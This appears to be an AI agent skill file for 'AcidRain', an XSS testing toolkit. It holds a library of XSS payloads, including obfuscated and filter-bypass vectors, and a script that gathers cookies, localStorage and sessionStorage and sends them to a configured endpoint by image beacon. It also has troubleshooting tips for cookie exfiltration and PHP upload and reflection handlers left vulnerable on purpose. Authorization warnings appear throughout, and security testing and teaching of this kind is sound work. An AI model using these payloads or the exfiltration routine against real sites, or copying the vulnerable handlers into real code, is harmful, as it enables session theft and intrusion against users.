---
name: acidrain-xss-security-testing
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized web security research and learning
triggers:
  - use acidrain for xss testing
  - test cross-site scripting with acidrain
  - analyze xss vulnerabilities with acidrain scripts
  - run acidrain security testing tools
  - demonstrate xss injection with acidrain
  - setup acidrain web security research environment
  - use acidrain javascript and php security utilities
  - perform authorized penetration testing with acidrain
---

# AcidRain XSS Security Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

AcidRain is a 2026 web-oriented collection of XSS (Cross-Site Scripting) analysis resources, JavaScript utilities, PHP examples, and injection testing samples designed for authorized security testing, hands-on learning, and controlled research environments. The project provides browser-side and server-side scripts organized for security researchers, penetration testers, and developers studying web vulnerabilities.

**Key capabilities:**
- XSS payload analysis and testing
- JavaScript-based client-side security utilities
- PHP server-side testing examples
- Input handling and output encoding research
- Injection testing sample code
- Educational security demonstration scripts

**⚠️ CRITICAL:** Only use AcidRain scripts against systems you own or have explicit written authorization to test. Unauthorized security testing is illegal.

## Installation

### Clone the Repository

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain_xss_toolbox
```

### Directory Structure

```text
acidrain_xss_toolbox/
├── scripts/
│   ├── javascript/    # Client-side security utilities
│   ├── php/          # Server-side testing examples
│   └── xss/          # XSS-specific payloads and tests
├── configs/          # Configuration templates
├── examples/         # Working demonstration code
├── docs/             # Documentation
└── README.md
```

## Environment Setup

### For JavaScript Testing

**Requirements:**
- Modern web browser (Chrome, Firefox, Edge)
- Local web server (for testing in realistic conditions)
- Developer console access

**Basic HTTP Server:**

```bash
# Python 3
python3 -m http.server 8000

# PHP
php -S localhost:8000

# Node.js
npx http-server -p 8000
```

### For PHP Testing

**Requirements:**
- PHP 7.4+ or PHP 8.x
- Web server (Apache, Nginx) or PHP built-in server
- Write access to test directories

**Test Environment Setup:**

```bash
# Start PHP development server
cd acidrain_xss_toolbox/scripts/php
php -S localhost:8080
```

## Core Concepts

### XSS Testing Workflow

1. **Identify input points** - Forms, URL parameters, headers
2. **Select appropriate payload** - From AcidRain XSS collection
3. **Inject and observe** - Monitor application response
4. **Analyze behavior** - Check encoding, filtering, execution
5. **Document findings** - Record vulnerable inputs and contexts

### Script Categories

**JavaScript Utilities** - Client-side testing:
- DOM manipulation testers
- Cookie/storage access scripts
- Event listener injection
- Payload delivery mechanisms

**PHP Resources** - Server-side testing:
- Input reflection examples
- Output encoding demonstrations
- SQL injection patterns
- File upload handlers

**XSS Samples** - Injection payloads:
- Basic alert() payloads
- DOM-based XSS vectors
- Stored XSS examples
- Reflected XSS patterns

## JavaScript Security Testing

### Basic XSS Payload Tester

```javascript
// scripts/javascript/xss-payload-tester.js

/**
 * Test XSS payload injection in various contexts
 * Use only on authorized test applications
 */

const XSSPayloadTester = {
  // Basic payloads for initial testing
  payloads: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
  ],

  // Test input field with payload
  testInput: function(inputElement, payload) {
    if (!inputElement) {
      console.error('Invalid input element');
      return false;
    }

    console.log(`Testing payload: ${payload}`);
    inputElement.value = payload;
    
    // Trigger common events
    inputElement.dispatchEvent(new Event('input'));
    inputElement.dispatchEvent(new Event('change'));
    
    return true;
  },

  // Test URL parameter injection
  testURLParam: function(paramName, payload) {
    const url = new URL(window.location.href);
    url.searchParams.set(paramName, payload);
    
    console.log(`Testing URL: ${url.toString()}`);
    // Don't auto-navigate in production
    return url.toString();
  },

  // Analyze page for potential injection points
  findInjectionPoints: function() {
    const inputs = document.querySelectorAll('input, textarea');
    const points = [];

    inputs.forEach((input, idx) => {
      points.push({
        index: idx,
        type: input.type,
        name: input.name || input.id || `unnamed-${idx}`,
        element: input
      });
    });

    console.log(`Found ${points.length} potential injection points`);
    return points;
  },

  // Monitor DOM changes for XSS execution
  monitorDOM: function(callback) {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList') {
          console.log('DOM modified:', mutation.target);
          if (callback) callback(mutation);
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true
    });

    return observer;
  }
};

// Example usage
if (typeof module !== 'undefined' && module.exports) {
  module.exports = XSSPayloadTester;
}
```

### Cookie and Storage Access Utility

```javascript
// scripts/javascript/storage-accessor.js

/**
 * Demonstrate cookie and storage access patterns
 * Educational purposes - authorized testing only
 */

const StorageAccessor = {
  // Read all cookies
  getCookies: function() {
    const cookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      cookies[name] = value;
    });
    return cookies;
  },

  // Exfiltrate data to controlled endpoint
  exfiltrateData: function(data, endpoint) {
    // Use environment variable for test endpoint
    const testEndpoint = endpoint || process.env.ACIDRAIN_TEST_ENDPOINT;
    
    if (!testEndpoint) {
      console.error('No test endpoint configured');
      return;
    }

    console.log('Exfiltrating to:', testEndpoint);
    
    // Method 1: Image beacon
    const img = new Image();
    img.src = `${testEndpoint}?data=${encodeURIComponent(JSON.stringify(data))}`;
    
    return true;
  },

  // Read localStorage
  readLocalStorage: function() {
    const storage = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      storage[key] = localStorage.getItem(key);
    }
    return storage;
  },

  // Read sessionStorage
  readSessionStorage: function() {
    const storage = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      storage[key] = sessionStorage.getItem(key);
    }
    return storage;
  },

  // Collect all client-side data
  collectAllData: function() {
    return {
      cookies: this.getCookies(),
      localStorage: this.readLocalStorage(),
      sessionStorage: this.readSessionStorage(),
      url: window.location.href,
      referrer: document.referrer,
      userAgent: navigator.userAgent
    };
  }
};

// Usage in authorized test
console.log('Client-side data collection test');
const collectedData = StorageAccessor.collectAllData();
console.log(collectedData);
```

## PHP Security Testing

### Input Reflection Test Script

```php
<?php
// scripts/php/input-reflection-test.php

/**
 * Demonstrate input reflection vulnerabilities
 * For educational testing in controlled environments only
 */

// Configuration - use environment variables
$test_mode = getenv('ACIDRAIN_TEST_MODE') ?: 'safe';

/**
 * Unsafe input reflection (demonstrates vulnerability)
 */
function unsafe_reflection($input) {
    // VULNERABLE: Direct reflection without encoding
    echo "<div>You entered: " . $input . "</div>";
}

/**
 * Safe input reflection (demonstrates mitigation)
 */
function safe_reflection($input) {
    // SAFE: Proper HTML encoding
    echo "<div>You entered: " . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</div>";
}

/**
 * Test various encoding contexts
 */
function test_encoding_contexts($input) {
    echo "<h3>Testing Encoding Contexts</h3>";
    
    // HTML context
    echo "<p>HTML context (safe): " . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</p>";
    
    // Attribute context
    echo '<input type="text" value="' . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . '">';
    
    // JavaScript context (needs additional encoding)
    $js_safe = json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
    echo "<script>var userInput = " . $js_safe . ";</script>";
    
    // URL context
    echo '<a href="?param=' . urlencode($input) . '">Link</a>';
}

// Main execution
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>AcidRain Input Reflection Test</title>
</head>
<body>
    <h1>Input Reflection Test</h1>
    <p><strong>Test Mode:</strong> <?php echo htmlspecialchars($test_mode); ?></p>
    
    <form method="GET">
        <label>Test Input:</label>
        <input type="text" name="test_input" value="<?php echo htmlspecialchars($_GET['test_input'] ?? ''); ?>">
        <button type="submit">Submit</button>
    </form>
    
    <?php
    if (isset($_GET['test_input'])) {
        $input = $_GET['test_input'];
        
        echo "<h2>Results</h2>";
        
        if ($test_mode === 'vulnerable') {
            echo "<h3>Unsafe Reflection (VULNERABLE)</h3>";
            unsafe_reflection($input);
        } else {
            echo "<h3>Safe Reflection</h3>";
            safe_reflection($input);
        }
        
        echo "<hr>";
        test_encoding_contexts($input);
    }
    ?>
</body>
</html>
```

### File Upload Security Test

```php
<?php
// scripts/php/file-upload-test.php

/**
 * File upload security testing
 * Educational demonstration - authorized environments only
 */

$upload_dir = getenv('ACIDRAIN_UPLOAD_DIR') ?: '/tmp/acidrain_test_uploads/';

// Ensure upload directory exists
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}

/**
 * Vulnerable file upload (no validation)
 */
function vulnerable_upload($file) {
    global $upload_dir;
    
    $target = $upload_dir . basename($file['name']);
    
    // VULNERABLE: No validation
    if (move_uploaded_file($file['tmp_name'], $target)) {
        return ['success' => true, 'path' => $target];
    }
    
    return ['success' => false, 'error' => 'Upload failed'];
}

/**
 * Secure file upload (with validation)
 */
function secure_upload($file) {
    global $upload_dir;
    
    // Whitelist allowed extensions
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt'];
    $max_size = 5 * 1024 * 1024; // 5MB
    
    // Validate size
    if ($file['size'] > $max_size) {
        return ['success' => false, 'error' => 'File too large'];
    }
    
    // Validate extension
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_extensions)) {
        return ['success' => false, 'error' => 'Invalid file type'];
    }
    
    // Generate safe filename
    $safe_name = bin2hex(random_bytes(16)) . '.' . $ext;
    $target = $upload_dir . $safe_name;
    
    // Verify MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    $allowed_mimes = [
        'image/jpeg', 'image/png', 'image/gif',
        'application/pdf', 'text/plain'
    ];
    
    if (!in_array($mime, $allowed_mimes)) {
        return ['success' => false, 'error' => 'Invalid MIME type'];
    }
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        return ['success' => true, 'path' => $safe_name];
    }
    
    return ['success' => false, 'error' => 'Upload failed'];
}

// Handle upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['test_file'])) {
    $mode = $_POST['mode'] ?? 'secure';
    
    if ($mode === 'vulnerable') {
        $result = vulnerable_upload($_FILES['test_file']);
    } else {
        $result = secure_upload($_FILES['test_file']);
    }
    
    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Security Test</title>
</head>
<body>
    <h1>File Upload Security Test</h1>
    
    <form method="POST" enctype="multipart/form-data">
        <label>Select file:</label>
        <input type="file" name="test_file" required>
        
        <label>Test mode:</label>
        <select name="mode">
            <option value="secure">Secure (recommended)</option>
            <option value="vulnerable">Vulnerable (testing only)</option>
        </select>
        
        <button type="submit">Upload</button>
    </form>
</body>
</html>
```

## XSS Payload Library

### Common XSS Vectors

```javascript
// scripts/xss/payload-library.js

/**
 * Comprehensive XSS payload library
 * For authorized security testing only
 */

const XSSPayloads = {
  // Basic script injection
  basic: [
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
  ],

  // Image-based vectors
  image: [
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<img/src=x onerror=alert(1)>',
    '<img src=x:alert(1) onerror=eval(src)>',
  ],

  // SVG-based vectors
  svg: [
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  ],

  // Input breaking
  inputBreak: [
    '"><script>alert(1)</script>',
    '\' onload=alert(1) x=\'',
    '" autofocus onfocus=alert(1) x="',
    '`><script>alert(1)</script>',
  ],

  // Event handlers
  eventHandlers: [
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
  ],

  // DOM-based
  domBased: [
    '#<script>alert(1)</script>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
  ],

  // Obfuscated
  obfuscated: [
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
  ],

  // Filter bypass
  filterBypass: [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRİPT>alert(1)</SCRİPT>',
    '<<SCRIPT>alert(1);//<</SCRIPT>',
  ],

  // Generate custom payload
  generate: function(action, context = 'html') {
    const templates = {
      html: `<script>${action}</script>`,
      attribute: `" onload="${action}" x="`,
      url: `javascript:${action}`,
      svg: `<svg onload="${action}">`
    };
    
    return templates[context] || templates.html;
  }
};

// Export for use in testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = XSSPayloads;
}
```

## Configuration

### Environment Variables

Create a `.env` file for test configuration:

```bash
# AcidRain Configuration
# NEVER commit real credentials or production endpoints

# Test mode: safe, vulnerable
ACIDRAIN_TEST_MODE=safe

# Test server endpoint for data exfiltration testing
ACIDRAIN_TEST_ENDPOINT=http://localhost:9000/collect

# Upload test directory
ACIDRAIN_UPLOAD_DIR=/tmp/acidrain_test_uploads/

# Logging level
ACIDRAIN_LOG_LEVEL=debug

# Test database (for SQL injection testing)
ACIDRAIN_TEST_DB_HOST=localhost
ACIDRAIN_TEST_DB_NAME=security_test_db
ACIDRAIN_TEST_DB_USER=testuser
ACIDRAIN_TEST_DB_PASS=testpassword
```

### Loading Configuration in PHP

```php
<?php
// Load environment variables
$dotenv_file = __DIR__ . '/.env';
if (file_exists($dotenv_file)) {
    $lines = file($dotenv_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        list($key, $value) = explode('=', $line, 2);
        putenv(trim($key) . '=' . trim($value));
    }
}
?>
```

## Common Testing Patterns

### Pattern 1: Automated Payload Testing

```javascript
// Run multiple payloads against input points
const payloads = XSSPayloads.basic.concat(XSSPayloads.image);
const injectionPoints = XSSPayloadTester.findInjectionPoints();

injectionPoints.forEach(point => {
  payloads.forEach(payload => {
    console.log(`Testing ${point.name} with payload ${payload}`);
    XSSPayloadTester.testInput(point.element, payload);
    
    // Wait and observe
    setTimeout(() => {
      console.log('Payload executed or filtered');
    }, 1000);
  });
});
```

### Pattern 2: Safe vs Vulnerable Comparison

```php
<?php
// Compare safe and unsafe handling
$test_input = $_GET['input'] ?? '<script>alert("XSS")</script>';

echo "<h2>Vulnerable Output</h2>";
echo "<div>" . $test_input . "</div>"; // UNSAFE

echo "<h2>Safe Output</h2>";
echo "<div>" . htmlspecialchars($test_input, ENT_QUOTES, 'UTF-8') . "</div>"; // SAFE
?>
```

### Pattern 3: Context-Aware Testing

```javascript
// Test different injection contexts
const testContexts = {
  htmlBody: (payload) => {
    document.body.innerHTML += payload;
  },
  
  attribute: (payload) => {
    const div = document.createElement('div');
    div.setAttribute('data-test', payload);
    document.body.appendChild(div);
  },
  
  scriptContext: (payload) => {
    const script = document.createElement('script');
    script.textContent = `var data = "${payload}";`;
    document.head.appendChild(script);
  }
};

// Test each context
Object.keys(testContexts).forEach(context => {
  console.log(`Testing context: ${context}`);
  testContexts[context]('<img src=x onerror=alert(1)>');
});
```

## Troubleshooting

### Scripts Not Executing

**Issue:** XSS payloads not triggering in test environment

**Solutions:**
```javascript
// Check CSP (Content Security Policy)
const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
if (csp) {
  console.log('CSP detected:', csp.content);
}

// Check for inline script blocking
console.log('Inline scripts allowed:', 
  !document.querySelector('meta[http-equiv="Content-Security-Policy"]'));

// Try alternative payload delivery
const payload = XSSPayloads.generate('console.log("executed")', 'svg');
console.log('Alternative payload:', payload);
```

### PHP Upload Tests Failing

**Issue:** File upload test returns permission errors

**Solutions:**
```bash
# Fix directory permissions
chmod 755 /tmp/acidrain_test_uploads
chown www-data:www-data /tmp/acidrain_test_uploads

# Check PHP configuration
php -i | grep upload_max_filesize
php -i | grep post_max_size

# Verify temp directory
php -r "echo sys_get_temp_dir();"
```

### Cookie Exfiltration Not Working

**Issue:** Cannot read cookies via JavaScript

**Solutions:**
```javascript
// Check HttpOnly flag
console.log('Cookies:', document.cookie);
if (!document.cookie) {
  console.log('Cookies may be HttpOnly or unavailable');
}

// Check SameSite attribute
// Inspect in browser DevTools > Application > Cookies

// Alternative: Use stored XSS on same domain
const testCookie = 'acidrain_test=value123; Path=/';
document.cookie = testCookie;
console.log('Test cookie set:', document.cookie.includes('acidrain_test'));
```

### DOM Mutations Not Detected

**Issue:** MutationObserver not triggering

**Solutions:**
```javascript
// Verify observer configuration
const observer = new MutationObserver((mutations) => {
  console.log('Mutations detected:', mutations.length);
  mutations.forEach(m => console.log(m.type, m.target));
});

observer.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true,
  characterData: true
});

// Test with known mutation
document.body.appendChild(document.createElement('div'));
```

## Integration with Testing Workflows

### Burp Suite Integration

```javascript
// Generate payload list for Burp Intruder
const payloadList = [
  ...XSSPayloads.basic,
  ...XSSPayloads.image,
  ...XSSPayloads.svg
].join('\n');

// Save to file for Burp import
console.log(payloadList);
// Copy output to burp_payloads.txt
```

### OWASP ZAP Integration

```bash
# Export AcidRain payloads for ZAP fuzzer
cd acidrain_xss_toolbox/scripts/xss
cat payload-library.js | grep -E "^    '[<]" | sed "s/.*'\(.*\)'.*/\1/" > zap-payloads.txt
```

### CI/CD Security Testing

```yaml
# .github/workflows/security-test.yml
name: Security Testing with AcidRain

on: [push, pull_request]

jobs:
  xss-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup test environment
        run: |
          cd acidrain_xss_toolbox
          php -S localhost:8080 &
          
      - name: Run XSS tests
        run: |
          node scripts/javascript/xss-payload-tester.js
          
      - name: Security scan results
        run: echo "Review test output for vulnerabilities"
```

## Best Practices

1. **Always get authorization** - Written permission before any testing
2. **Use isolated environments** - Never test production systems
3. **Document findings** - Keep detailed logs of discovered issues
4. **Responsible disclosure** - Report vulnerabilities properly
5. **Clean up artifacts** - Remove test files and payloads after testing
6. **Respect scope** - Stay within agreed testing boundaries
7. **Use version control** - Track payload modifications
8. **Validate safe mode** - Default to safe operations

## Legal and Ethical Considerations

⚠️ **WARNING:** Unauthorized computer access is illegal in most jurisdictions. AcidRain tools are provided for:

- Educational purposes in controlled lab environments
- Authorized penetration testing with written permission
- Security research on systems you own
- Bug bounty programs with explicit scope

**Never use these tools:**
- Against systems without authorization
- To cause harm or disruption
- For illegal activities
- Outside agreed testing scope
